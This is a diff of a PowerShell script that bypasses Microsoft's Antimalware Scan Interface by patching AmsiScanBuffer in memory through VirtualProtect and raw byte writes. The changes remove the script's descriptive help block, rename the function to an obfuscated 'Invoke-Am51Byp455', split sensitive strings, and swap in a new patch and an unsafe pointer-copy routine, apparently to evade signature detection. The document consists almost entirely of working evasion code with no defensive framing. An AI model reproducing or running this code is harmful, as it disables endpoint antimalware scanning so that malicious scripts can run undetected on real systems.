@@ -1,26 +1,21 @@
-<#
-.SYNOPSIS
-Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. 
-By default EDRs consumes AMSI events as part of interpreted script detection during runtime, its also the first protection against obfuscation.
-
-.DESCRIPTION
-Antimalware Scan Interface by patching AmsiScanBuffer function 
- 
-.EXAMPLE
-Invoke-AmsiBypass1
- 
-Description
------------
-Patching AmsiScanBuffer
-#>
-
-
 $Win32 = @"
 
 using System;
 using System.Runtime.InteropServices;
 
 public class Win32 {
+
+	public class MemoryOperations {
+    public static void WriteToMemory(byte[] patch, IntPtr address) {
+        unsafe {
+            fixed (byte* p = patch) {
+                byte* ptr = (byte*)address.ToPointer();
+                for (int i = 0; i < patch.Length; i++) {
+                    ptr[i] = p[i];
+                }
+            }
+        }
+    }
 
     [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
     public static extern IntPtr gpa(IntPtr hModule, string procName);
@@ -36,7 +31,7 @@ public class Win32 {
 
 
 
-function Invoke-AmsiBypass1 {
+function Invoke-Am51Byp455{
     [CmdletBinding()]
     [OutputType([string])]
     Param
@@ -52,10 +47,9 @@ function Invoke-AmsiBypass1 {
 		$LoadLibrary = [Win32]::ll("am" + "si.dll")
 		$Address = [Win32]::gpa($LoadLibrary, "Amsi" + "Scan" + "Buffer")
 		$p = 0
-		[Win32]::vp($Address, [uint32]7, 0x40, [ref]$p)
-		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)
-		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 7)
-
+		[Win32]::vp($Address, [uint32]4, 0x40, [ref]$p)
+		$Patch = [Byte[]] (0x4C,0x8B,0xDC,0xC3)
+		[MemoryOperations]::WriteToMemory($patch, $address)
     }
 
 }
